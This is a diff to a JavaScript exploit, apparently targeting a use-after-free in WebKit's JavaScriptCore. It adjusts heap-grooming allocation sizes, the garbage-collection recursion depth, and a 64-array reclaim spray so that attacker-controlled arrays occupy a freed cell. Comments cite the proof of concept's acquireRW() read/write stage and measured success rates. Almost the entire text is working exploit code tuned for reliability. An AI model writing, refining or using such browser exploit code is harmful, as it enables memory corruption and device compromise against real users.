@@ -28,7 +28,10 @@
     let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
     arr[arr_index] = A; let forGC = [];
     let a = new Date(1111); a[0] = 1.1;
-    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
+    // 1 MB units, as the PoC tuned them: at 8 MB the allocation counter overshoots
+    // JSC's collection threshold in huge steps and pins whatever has not been
+    // reclaimed (the PoC measured 597-776 MB peak and lost 17 of 20 runs).
+    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x100000));
     A.p2 = forGC;
     let b = { p0: 0x42424242, p1: 1.1 };
     let f; f = b; if (flag) { f = 1.1; }
@@ -37,20 +40,25 @@
     b.p0 = v; b.p1 = a;
   }
   function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }
+  // The PoC drives the GC with an 800-frame recursion wrapped in try/catch, NOT
+  // a 10000-frame one.  (Our 10000 version is what produced
+  //  "RangeError: Maximum call stack size exceeded" on every device.)
+  function safeRec() { try { rec(800); } catch (e) { } }
+  var reclaimed = [];    // the sprayed arrays are KEPT alive, as in the PoC
 
   guard('carrier', function () {
     arr = new Array(0x400000).fill(1.1);
     arr_index = arr.length - 1;
   });
 
-  // Warmup: the deep recursion is a GC-pressure trick from the original PoC and
-  // it can throw RangeError on a small native stack -- that must NOT abort the
-  // run, it only costs us the grooming round.
+  // Warmup: exactly the PoC's acquireRW() prologue -- two triggerUAF calls, 1000
+  // cheap ones, then twenty 800-frame GC recursions (each in a try/catch, so a
+  // RangeError can never abort the run).
   aveStep('init: carrier allocated, warming up the JIT (the one-time slow phase)');
   guard('warmup', function () {
     foo(true, 1, 1); foo(false, 1, 1);
     for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
-    for (let i = 0; i < 10000; i++) rec(i);
+    for (let i = 0; i < 20; ++i) safeRec();
   });
   out.exp.warmupMs = Date.now() - t0;
   aveStep('warmup done in ' + out.exp.warmupMs + 'ms, warnings=' + out.guard.length +
@@ -59,20 +67,20 @@
   guard('hunt', function () {
     for (let k = 0; k < 10000 && !W; ++k) {
       rounds = k + 1;
-      // The original PoC's per-round dynamics are what actually frees the slot:
-      // foo() with the full inner loop (JIT warmup + the OSR'd function that
-      // mispredicts), and a 10000-frame recursion whose depth is what drives the
-      // GC.  Measured on device: a shaved round costs 28 ms and did NOT fire in
-      // 4875 attempts, whereas the unshaved round costs ~100 ms -- the GC
-      // pressure, not the round count, is the trigger.
+      // The PoC's per-round dynamics: foo() with the full inner loop (JIT warmup +
+      // the OSR'd function that mispredicts), an 800-frame GC recursion, 3 small
+      // buffers, then a 64-array reclaim spray.
       foo(false, 10, k % 5 + 1);
-      rec(10000);
+      safeRec();
       for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
       let fr = arr[arr_index].p1.p1;
       let noCow = 13.37;
-      for (let i = 0; i < 16; ++i) {
+      // The PoC sprays 64 arrays per round and KEEPS them (reclaimed) so the cell it
+      // targets stays occupied by our memory -- dropping them lets anything reuse it.
+      for (let i = 0; i < 64; ++i) {
         let c = [13.37, 2.2, 3.3, 4.4, noCow];
-        if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; }
+        reclaimed.push(c);
+        try { if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; } } catch (e) { }
       }
       if (k % 25 === 24) aveStep('hunt round=' + rounds +
                                   ' elapsed=' + (Date.now() - t0) + 'ms trigger=no');
